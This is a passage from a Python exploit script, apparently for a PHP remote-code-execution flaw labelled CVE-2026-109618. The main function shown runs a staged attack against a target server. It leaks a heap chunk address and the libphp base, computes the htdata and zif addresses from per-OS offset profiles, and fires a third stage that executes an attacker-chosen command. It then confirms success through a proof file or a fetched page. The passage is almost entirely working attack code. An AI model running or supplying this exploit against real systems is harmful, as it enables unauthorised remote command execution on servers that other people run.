                needed = args.probe_mb
            if needed > args.huge_mb:
                print(f"[*] raising OOM body to {needed} MiB for memory_limit={limit}")
                args.huge_mb = needed

        if args.check:
            return 0 if not fails else 2
        if fails and not args.force:
            return 2
        if selected is None:
            print("NO_VERIFIED_PROFILE", file=sys.stderr)
            return 2

    if args.chain != "109618":
        print(
            "CVE-2026-109619 has no public RCE chain; only leak/detection research is available.",
            file=sys.stderr,
        )
        return 2

    if selected is None:
        selected = PROFILES["bookworm"]
    profile = replace(
        selected,
        zif=args.zif_offset if args.zif_offset is not None else selected.zif,
        dtor=args.dtor_offset if args.dtor_offset is not None else selected.dtor,
        htdata=args.htdata_offset if args.htdata_offset is not None else selected.htdata,
        stage1_n=args.stage1_n if args.stage1_n is not None else selected.stage1_n,
        stage2_t=args.stage2_t if args.stage2_t is not None else selected.stage2_t,
        stage2_v=args.stage2_v if args.stage2_v is not None else selected.stage2_v,
    )

    proof_path = Path(args.proof_file) if args.proof_file else None
    if not args.quiet:
        print(f"[*] target: {args.target}")
        print(f"[*] command: {command}")
        print(f"[*] profile: {profile.name} zif=0x{profile.zif:x} dtor=0x{profile.dtor:x} "
              f"htdata=0x{profile.htdata:x}")

    exploit = Exploit(target, profile, command.encode(), huge_mb=args.huge_mb,
                      quiet=args.quiet)

    try:
        if not args.no_rotate:
            exploit.rotate()

        chunk = 0
        for attempt in range(1, args.retries + 1):
            exploit.log(f"[*] stage 1: heap leak ({attempt}/{args.retries})")
            chunk = exploit.leak_chunk()
            if chunk:
                exploit.log(f"[+] chunk base: 0x{chunk:x}")
                break
            exploit.log("[-] heap leak missed")
            if not args.no_rotate:
                exploit.rotate()
        if not chunk:
            print("HEAP_LEAK_FAILED", file=sys.stderr)
            return 1

        if not args.no_rotate:
            exploit.rotate()

        libphp = 0
        for attempt in range(1, args.retries + 1):
            exploit.log(f"[*] stage 2: libphp leak ({attempt}/{args.retries})")
            libphp = exploit.leak_libphp()
            if libphp:
                exploit.log(f"[+] libphp base: 0x{libphp:x}")
                break
            exploit.log("[-] libphp leak missed")
            if not args.no_rotate:
                exploit.rotate()
        if not libphp:
            print("LIBPHP_LEAK_FAILED", file=sys.stderr)
            return 1

        if not args.no_rotate:
            exploit.rotate()

        htdata = chunk + profile.htdata
        zif = libphp + profile.zif
        exploit.log(f"[*] stage 3: htdata=0x{htdata:x} zif=0x{zif:x}")

        baseline_status, baseline_body = 0, b""
        if args.fetch and not proof_path:
            baseline_status, _, baseline_body = target.get(args.fetch)

        before = snapshot(proof_path)
        for attempt in range(1, args.retries + 2):
            try:
                exploit.stage3(htdata, zif)
            except (OSError, ValueError) as exc:
                exploit.log(f"[-] stage 3 request: {exc}")
            time.sleep(0.8)

            proof = read_proof(proof_path, before)
            if not proof and args.fetch and not proof_path:
                status, _, body = target.get(args.fetch)
                if status == 200 and body and body != baseline_body:
                    proof = body.decode("latin1", errors="replace").strip()
            if proof:
                print(f"PROOF: {proof}")
                return 0
            exploit.log(f"[-] stage 3 attempt {attempt}: no proof")
            if not args.no_rotate:
                exploit.rotate()
    except ConnectionError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        return 130

    print("EXPLOIT_FAILED (command may have executed blind)", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
